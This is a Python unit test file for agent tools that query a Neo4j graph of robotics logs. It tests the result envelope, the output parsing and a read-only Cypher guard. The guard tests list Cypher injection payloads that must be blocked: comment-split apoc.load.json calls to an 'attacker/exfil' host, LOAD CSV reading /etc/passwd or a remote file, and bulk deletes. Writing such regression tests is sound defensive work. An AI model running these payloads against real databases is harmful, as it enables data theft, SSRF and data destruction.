"""Unit coverage for the tool `{ok/error}` envelope contract and the
BaseSpecialist parsing / tool-def-narrowing helpers.

Tools tested (representative — one per worker family):
  - trajectory_analyzer.query_topic   (Neo4j-backed list)
  - rosbag_reader.query_graph         (read-only Cypher guard + Neo4j)
  - planner_failure_inspector.find_aborts
  - rosbag_reader.retrieve_logs       (embedding + vector search)

Contract (from app/agent/tools/__init__.py):
  success  -> {"ok": True,  "result": ...}
  failure  -> {"ok": False, "error": {"code", "message", "retryable"}}

The autouse `mock_neo4j` fixture stubs `neo4j_client.run_query` to return [].
For the neo4j_failed path we monkeypatch run_query on each tool module's
imported `neo4j_client` so it raises.
"""
from __future__ import annotations

from app.agent.specialists.base import BaseSpecialist
from app.agent.tools import find_aborts, query_graph, query_topic, retrieve_logs
from app.services.neo4j_client import neo4j_client


# ── envelope shape helper ────────────────────────────────────────────────────


def _assert_ok(env: dict):
    assert env["ok"] is True
    assert "result" in env
    assert "error" not in env


def _assert_error(env: dict, *, code: str, retryable: bool | None = None):
    assert env["ok"] is False
    assert "error" in env
    err = env["error"]
    assert err["code"] == code
    assert isinstance(err["message"], str)
    assert "retryable" in err
    if retryable is not None:
        assert err["retryable"] is retryable


# ── query_topic ──────────────────────────────────────────────────────────────


def test_query_topic_ok_envelope():
    # mock_neo4j returns [] from run_query → success with empty result list.
    env = query_topic.run({"session_id": "s1", "topic": "/scan"})
    _assert_ok(env)
    assert env["result"] == []


def test_query_topic_neo4j_failed(monkeypatch):
    def _boom(*a, **k):
        raise RuntimeError("bolt down")

    monkeypatch.setattr(neo4j_client, "run_query", _boom)
    env = query_topic.run({"session_id": "s1", "topic": "/scan"})
    _assert_error(env, code="neo4j_failed", retryable=True)
    assert "bolt down" in env["error"]["message"]


# ── query_graph (read-only guard) ────────────────────────────────────────────


def test_query_graph_ok_envelope():
    env = query_graph.run({"session_id": "s1", "cypher": "MATCH (s:Session {id: $session_id}) RETURN s"})
    _assert_ok(env)


def test_query_graph_missing_cypher():
    env = query_graph.run({"session_id": "s1", "cypher": "   "})
    _assert_error(env, code="missing_cypher", retryable=False)


def test_query_graph_blocks_write_operations():
    env = query_graph.run({"session_id": "s1", "cypher": "MATCH (s) DELETE s"})
    _assert_error(env, code="write_blocked", retryable=False)


def test_query_graph_blocks_merge_case_insensitive():
    env = query_graph.run({"session_id": "s1", "cypher": "mErGe (n:Foo)"})
    _assert_error(env, code="write_blocked", retryable=False)


def test_query_graph_blocks_comment_split_procedure_calls():
    """Regression: Cypher ignores comments, so a comment placed between `CALL`
    and the procedure namespace used to slip past `_WRITE_PATTERN` entirely.

    That mattered because the blocklist is the only barrier — Neo4j boots with
    `NEO4J_dbms_security_procedures_unrestricted=apoc.*` and queries run in the
    driver's default (write) access mode — so a bypass reached `apoc.load.json`
    (SSRF/exfiltration) and `apoc.cypher.doIt` (arbitrary writes).
    """
    bypasses = [
        'CALL /*x*/apoc.load.json("http://attacker/exfil")',
        'CALL //c\napoc.load.json("http://attacker/exfil")',
        "CALL dbms/*x*/.components()",
        "CALL\napoc.load.json('http://attacker/exfil')",
        "CALL apoc . load.json('http://attacker/exfil')",
    ]
    for cypher in bypasses:
        env = query_graph.run({"session_id": "s1", "cypher": cypher})
        _assert_error(env, code="write_blocked", retryable=False)


def test_query_graph_comment_strip_preserves_string_literals():
    """A URL inside a string literal contains `//`, but stripping from there to
    end-of-line would swallow a following write verb and create a NEW bypass.
    Comments are only removed outside quoted literals, so this stays blocked."""
    env = query_graph.run(
        {"session_id": "s1", "cypher": 'MATCH (n) WHERE n.u = "http://x" CREATE (m)'}
    )
    _assert_error(env, code="write_blocked", retryable=False)


def test_query_graph_appends_limit_when_absent(monkeypatch):
    seen: dict = {}

    def _capture(cypher, params):
        seen["cypher"] = cypher
        seen["params"] = params
        return []

    monkeypatch.setattr(neo4j_client, "run_query", _capture)
    query_graph.run({"session_id": "s1", "cypher": "MATCH (s:Session {id:$session_id}) RETURN s", "limit": 7})
    # The query is wrapped in a neo4j.Query (to carry a server-side timeout);
    # str(Query) is the underlying text, where the appended LIMIT lives.
    assert "LIMIT 7" in str(seen["cypher"])
    # session_id is always injected into params.
    assert seen["params"]["session_id"] == "s1"


def test_query_graph_neo4j_failed(monkeypatch):
    def _boom(*a, **k):
        raise RuntimeError("query exploded")

    monkeypatch.setattr(neo4j_client, "run_query", _boom)
    env = query_graph.run({"session_id": "s1", "cypher": "MATCH (s:Session {id:$session_id}) RETURN s"})
    _assert_error(env, code="neo4j_failed", retryable=True)


# ── query_graph hardening (extended blocklist + row/time caps) ────────────────


import pytest


@pytest.mark.parametrize(
    "cypher",
    [
        # General CALL db.* / dbms.* procedures (schema/internals enumeration).
        "CALL db.labels()",
        "CALL db.relationshipTypes()",
        "CALL dbms.components()",
        "CALL dbms.listConfig()",
        # Bulk file ingestion.
        "LOAD CSV FROM 'file:///etc/passwd' AS row RETURN row",
        "LOAD CSV WITH HEADERS FROM 'http://evil/x.csv' AS row RETURN row",
        # Subquery transactions (write/abuse vector). The construct itself must
        # be blocked even when the inner subquery contains no other write keyword.
        "MATCH (n) CALL { WITH n DETACH DELETE n } IN TRANSACTIONS",
        "CALL { CREATE (:X) } IN TRANSACTIONS OF 100 ROWS",
        "MATCH (n) CALL { WITH n RETURN n } IN TRANSACTIONS RETURN n",
        # apoc procedures (already-blocked family, kept covered).
        "CALL apoc.periodic.iterate('MATCH (n) RETURN n', 'DELETE n', {})",
    ],
)
def test_query_graph_blocks_extended_vectors(cypher):
    env = query_graph.run({"session_id": "s1", "cypher": cypher})
    _assert_error(env, code="write_blocked", retryable=False)


@pytest.mark.parametrize(
    "cypher",
    [
        "MATCH (n) RETURN n LIMIT 5",
        "MATCH (s:Session {id: $session_id})-[:HAS_LOG]->(l:Log) RETURN l WHERE l.severity = 'ERROR'",
        # CALL { ... } subquery WITHOUT IN TRANSACTIONS is a legitimate read.
        "MATCH (s:Session {id: $session_id}) CALL { WITH s MATCH (s)-[:HAS_LOG]->(l) RETURN count(l) AS c } RETURN c",
    ],
)
def test_query_graph_allows_normal_reads(monkeypatch, cypher):
    monkeypatch.setattr(neo4j_client, "run_query", lambda *a, **k: [])
    env = query_graph.run({"session_id": "s1", "cypher": cypher})
    _assert_ok(env)


def test_query_graph_row_cap_truncates_oversized_result(monkeypatch):
    # Even if a query slips past the textual LIMIT (e.g. literal "LIMIT" in a
    # string, subquery, …) the tool must not return more rows than the cap.
    over = [{"n": i} for i in range(50)]
    monkeypatch.setattr(neo4j_client, "run_query", lambda *a, **k: over)
    env = query_graph.run(
        {"session_id": "s1", "cypher": "MATCH (n) RETURN n LIMIT 1000000", "limit": 5}
    )
    _assert_ok(env)
    assert len(env["result"]) == 5


def test_query_graph_applies_server_side_timeout(monkeypatch):
    # The query handed to the driver must carry a server-side transaction
    # timeout so a single read can't run past the latency budget.
    from neo4j import Query

    seen: dict = {}

    def _capture(cypher, params):
        seen["cypher"] = cypher
        return []

    monkeypatch.setattr(neo4j_client, "run_query", _capture)
    query_graph.run({"session_id": "s1", "cypher": "MATCH (s:Session {id:$session_id}) RETURN s"})
    q = seen["cypher"]
    assert isinstance(q, Query), f"expected a neo4j.Query carrying a timeout, got {type(q)}"
    assert q.timeout is not None and q.timeout > 0


# ── find_aborts ──────────────────────────────────────────────────────────────


def test_find_aborts_ok_envelope():
    env = find_aborts.run({"session_id": "s1"})
    _assert_ok(env)
    assert env["result"] == []


def test_find_aborts_neo4j_failed(monkeypatch):
    def _boom(*a, **k):
        raise RuntimeError("session expired")

    monkeypatch.setattr(neo4j_client, "run_query", _boom)
    env = find_aborts.run({"session_id": "s1"})
    _assert_error(env, code="neo4j_failed", retryable=True)


# ── retrieve_logs (embedding + vector search) ────────────────────────────────


def test_retrieve_logs_embed_failed(monkeypatch):
    def _boom(_texts):
        raise RuntimeError("no embedding backend")

    monkeypatch.setattr(retrieve_logs.embedding_service, "embed_texts", _boom)
    env = retrieve_logs.run({"session_id": "s1", "query": "lidar dropout"})
    _assert_error(env, code="embed_failed", retryable=True)


def test_retrieve_logs_neo4j_failed_after_embed(monkeypatch):
    monkeypatch.setattr(retrieve_logs.embedding_service, "embed_texts", lambda texts: [[0.0, 0.1, 0.2]])

    def _boom(*a, **k):
        raise RuntimeError("vector index missing")

    monkeypatch.setattr(neo4j_client, "run_query", _boom)
    env = retrieve_logs.run({"session_id": "s1", "query": "lidar dropout"})
    _assert_error(env, code="neo4j_failed", retryable=True)


def test_retrieve_logs_ok_no_expand(monkeypatch):
    monkeypatch.setattr(retrieve_logs.embedding_service, "embed_texts", lambda texts: [[0.0, 0.1, 0.2]])
    hits = [{"log_id": "l_1", "ts": "00:00:01.000", "severity": "ERROR", "node": "/n", "msg": "x"}]
    monkeypatch.setattr(neo4j_client, "run_query", lambda *a, **k: hits)
    env = retrieve_logs.run({"session_id": "s1", "query": "q", "expand_neighbors": False})
    _assert_ok(env)
    assert env["result"] == hits


# ── BaseSpecialist._parse_text_as_result ─────────────────────────────────────


class _DummySpecialist(BaseSpecialist):
    name = "RootCauseAnalyst"  # type: ignore[assignment]


def _parse(text: str) -> dict:
    return _DummySpecialist()._parse_text_as_result(text)


def test_parse_empty_text_returns_empty_response_error():
    out = _parse("")
    assert out["error"] == "empty_response"
    assert out["findings"] == []
    assert out["confidence"] == 0.0


def test_parse_plain_json_object():
    out = _parse('{"findings": [{"sev": "info", "text": "ok"}], "confidence": 0.7}')
    assert out["confidence"] == 0.7
    # log_ids defaulted onto each finding.
    assert out["findings"][0]["log_ids"] == []


def test_parse_strips_json_code_fence():
    out = _parse('```json\n{"findings": [], "confidence": 0.9}\n```')
    assert out["confidence"] == 0.9


def test_parse_extracts_embedded_object_from_prose():
    out = _parse('Here you go: {"findings": [], "confidence": 0.5} thanks!')
    assert out["confidence"] == 0.5


def test_parse_malformed_json_reports_error():
    out = _parse("{not valid json at all")
    assert out["error"] in {"malformed_json", "no_json"}
    assert out["findings"] == []


def test_parse_no_braces_reports_no_json():
    out = _parse("just some words no object here")
    assert out["error"] == "no_json"


def test_parse_defaults_findings_and_confidence():
    out = _parse('{"something": 1}')
    assert out["findings"] == []
    assert out["confidence"] == 0.5


def test_parse_clamps_confidence_above_one():
    out = _parse('{"findings": [], "confidence": 5.0}')
    assert out["confidence"] == 1.0


def test_parse_clamps_confidence_below_zero():
    out = _parse('{"findings": [], "confidence": -3}')
    assert out["confidence"] == 0.0


def test_parse_non_numeric_confidence_falls_back():
    out = _parse('{"findings": [], "confidence": "high"}')
    assert out["confidence"] == 0.5


def test_parse_drops_non_dict_findings():
    out = _parse('{"findings": ["bad", {"sev": "info", "text": "good"}], "confidence": 0.4}')
    assert len(out["findings"]) == 1
    assert out["findings"][0]["text"] == "good"
    assert out["findings"][0]["log_ids"] == []


def test_parse_findings_not_a_list_coerced_to_empty():
    out = _parse('{"findings": "oops", "confidence": 0.4}')
    assert out["findings"] == []


def test_parse_preserves_existing_log_ids():
    out = _parse('{"findings": [{"sev": "critical", "text": "t", "log_ids": ["l_9"]}], "confidence": 0.8}')
    assert out["findings"][0]["log_ids"] == ["l_9"]


# ── tool-def narrowing (llm_tool_defs via worker_subset) ──────────────────────


def test_tool_defs_narrowed_to_worker_subset():
    from app.agent.mcp_client import llm_tool_defs

    subset = ["planner_failure_inspector"]
    defs = llm_tool_defs(worker_subset=subset)
    assert defs, "expected at least one tool for the subset"
    # Every returned tool name is namespaced to an allowed worker.
    assert all(d["name"].startswith("planner_failure_inspector__") for d in defs)
    # Each def carries the LLM ToolDef shape.
    for d in defs:
        assert set(d) >= {"name", "description", "parameters"}


def test_tool_defs_full_catalog_when_no_subset():
    from app.agent.mcp_client import llm_tool_defs

    all_defs = llm_tool_defs()
    narrowed = llm_tool_defs(worker_subset=["planner_failure_inspector"])
    # Full catalog is a strict superset of any single-worker narrowing.
    assert len(all_defs) > len(narrowed)
    workers = {d["name"].split("__", 1)[0] for d in all_defs}
    assert "rosbag_reader" in workers
    assert "planner_failure_inspector" in workers


def test_format_causal_chain_survives_a_cycle(monkeypatch):
    """#58: CAUSED/TRIGGERED edges are not guaranteed acyclic."""
    from app.agent.tools import format_causal_chain as fcc

    def _edge(src, dst):
        return {
            "src_id": src, "src_ts": "00:00:01.000", "src_node": "/a", "src_sev": "ERROR", "src_msg": src,
            "dst_id": dst, "dst_ts": "00:00:02.000", "dst_node": "/b", "dst_sev": "ERROR", "dst_msg": dst,
            "edge_type": "CAUSED",
        }

    # root -> a -> b -> a (cycle), plus an island c <-> d with no root at all.
    edges = [_edge("root", "a"), _edge("a", "b"), _edge("b", "a"), _edge("c", "d"), _edge("d", "c")]
    monkeypatch.setattr(neo4j_client, "run_query", lambda *a, **k: edges)

    out = fcc.run({"session_id": "s1"})

    assert out["ok"] is True
    tree = out["result"][0]["tree"]
    assert "cycle" in tree
    # Every node is shown, including the rootless island.
    for msg in ("root", "a", "b", "c", "d"):
        assert f": {msg}" in tree


def test_format_causal_chain_caps_very_deep_chains(monkeypatch):
    from app.agent.tools import format_causal_chain as fcc

    edges = [
        {
            "src_id": f"n{i}", "src_ts": "0", "src_node": "/a", "src_sev": "ERROR", "src_msg": f"m{i}",
            "dst_id": f"n{i + 1}", "dst_ts": "0", "dst_node": "/a", "dst_sev": "ERROR", "dst_msg": f"m{i + 1}",
            "edge_type": "CAUSED",
        }
        for i in range(3000)
    ]
    monkeypatch.setattr(neo4j_client, "run_query", lambda *a, **k: edges)

    out = fcc.run({"session_id": "s1"})

    assert out["ok"] is True
    assert "deeper levels not shown" in out["result"][0]["tree"]


# ── #59: one shared Neo4j error envelope for every tool ──────────────────────


def _neo4j_backed_tools():
    from app.agent import mcp_client
    # query_mcap reads DuckDB, not Neo4j. query_safety_rules runs one query per
    # rule and reports a failed rule inside an ok result, by design.
    skipped = {("rosbag_reader", "query_mcap"), ("planner_failure_inspector", "query_safety_rules")}
    return [(key, desc) for key, desc in sorted(mcp_client._REGISTRY.items()) if key not in skipped]


# Arguments that get each tool as far as its first query.
_ARGS = {
    "session_id": "s1", "session_id_a": "s1", "session_id_b": "s2", "baseline_session_id": "s0", "topic": "/scan",
    "node": "/planner", "event_log_id": "l_1", "signature_id": "nope", "metric": "rate",
    "query": "MATCH (l:Log) RETURN l", "cypher": "MATCH (l:Log) RETURN l",
}


@pytest.mark.parametrize("key", [key for key, _ in _neo4j_backed_tools()], ids=lambda k: ".".join(k))
def test_every_neo4j_tool_reports_a_failed_query_the_same_way(monkeypatch, key):
    from app.agent import mcp_client
    from app.agent.tools import retrieve_logs as retrieve_logs_mod

    def _boom(*_a, **_k):
        raise RuntimeError("bolt connection refused")

    monkeypatch.setattr(neo4j_client, "run_query", _boom)
    # retrieve_logs embeds the query before it touches Neo4j.
    monkeypatch.setattr(retrieve_logs_mod.embedding_service, "embed_texts", lambda texts, **_k: [[0.0] * 4])

    out = mcp_client._REGISTRY[key]["run"](dict(_ARGS))

    assert out == {
        "ok": False,
        "error": {"code": "neo4j_failed", "message": "bolt connection refused", "retryable": True},
    }


def test_neo4j_tool_does_not_relabel_other_errors():
    from app.agent.tools._neo4j import neo4j_tool

    @neo4j_tool
    def run(args):
        return {"ok": True, "result": args["missing"]}

    with pytest.raises(KeyError):
        run({})
